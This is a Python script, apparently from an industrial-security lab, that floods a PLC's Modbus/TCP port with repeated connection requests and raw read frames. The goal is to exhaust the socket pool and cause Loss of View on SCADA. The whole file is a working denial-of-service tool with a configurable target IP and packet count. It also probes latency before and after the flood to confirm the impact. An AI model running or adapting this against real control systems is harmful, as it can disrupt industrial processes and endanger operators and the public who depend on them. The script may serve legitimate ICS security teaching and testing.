#!/usr/bin/env python3
"""
IndustryLab — Industrial Attack 4: Modbus TCP Transaction Flooding & Link Saturation
Floods the PLC network interface with high-rate connection requests and malformed packets,
saturating the Modbus socket pool and causing Loss of View on the SCADA Historian.
"""

import sys
import time
import socket
import argparse


def measure_probe_latency(target_ip: str, port: int, timeout: float = 1.0) -> float:
    """Measures round-trip response latency (ms) for a legitimate Modbus query (SEC-13)."""
    raw_probe = bytes([0x12, 0x34, 0x00, 0x00, 0x00, 0x06, 0x01, 0x03, 0x00, 0x00, 0x00, 0x01])
    t0 = time.perf_counter()
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(timeout)
        s.connect((target_ip, port))
        s.sendall(raw_probe)
        resp = s.recv(1024)
        s.close()
        if len(resp) >= 7:
            return round((time.perf_counter() - t0) * 1000.0, 2)
    except Exception:
        return -1.0 # Timeout or connection refused
    return -1.0


def execute_dos(target_ip="127.0.0.1", port=502, num_packets=100, delay_s=0.005, verify_latency=True):
    print(f"\n[!] INITIATING ATTACK: Modbus/TCP Transaction Flooding on {target_ip}:{port}...")

    baseline_latency = -1.0
    if verify_latency:
        baseline_latency = measure_probe_latency(target_ip, port)
        print(f"[*] Pre-Attack Legitimate Modbus Probe Latency: {baseline_latency:.2f} ms" if baseline_latency >= 0 else "[-] Pre-Attack Probe: Target not reachable")

    # Craft raw MBAP frame requesting holding register 0
    # TxID=0xAAAA, Proto=0x0000, Len=0x0006, Unit=0x01, FC=0x03, Addr=0x0000, Count=0x0001
    raw_packet = bytes([0xAA, 0xAA, 0x00, 0x00, 0x00, 0x06, 0x01, 0x03, 0x00, 0x00, 0x00, 0x01])

    sent_count = 0
    failed_count = 0
    start_t = time.time()

    for i in range(num_packets):
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(0.5)
            s.connect((target_ip, port))
            s.sendall(raw_packet)
            sent_count += 1
            s.close()
            time.sleep(delay_s)
        except Exception as e:
            failed_count += 1

    duration = time.time() - start_t
    print(f"[+] Flooding Completed: Sent {sent_count}/{num_packets} packets (Failed: {failed_count}) in {duration:.2f}s (Rate: {sent_count/max(0.01, duration):.1f} pkt/s)")

    post_latency = -1.0
    if verify_latency:
        post_latency = measure_probe_latency(target_ip, port, timeout=0.8)
        if post_latency < 0:
            print("[+] IMPACT VERIFIED: Legitimate SCADA polling TIMED OUT or DENIED under load! (DoS Successful)")
        elif baseline_latency > 0 and post_latency > baseline_latency * 1.5:
            print(f"[+] IMPACT VERIFIED: Response latency degraded from {baseline_latency:.1f} ms to {post_latency:.1f} ms (+{(post_latency/baseline_latency - 1)*100:.0f}%)")
        else:
            print(f"[*] Post-Attack Probe Latency: {post_latency:.2f} ms")

    return sent_count > 0


def main():
    parser = argparse.ArgumentParser(description="Modbus Transaction Flood DoS")
    parser.add_argument("--target", default="127.0.0.1", help="Target PLC IP")
    parser.add_argument("--port", type=int, default=502, help="Target PLC Port")
    parser.add_argument("--count", type=int, default=50, help="Number of flood packets")
    parser.add_argument("--no-verify", action="store_true", help="Skip latency verification")
    args = parser.parse_args()

    execute_dos(target_ip=args.target, port=args.port, num_packets=args.count, verify_latency=not args.no_verify)


if __name__ == "__main__":
    main()
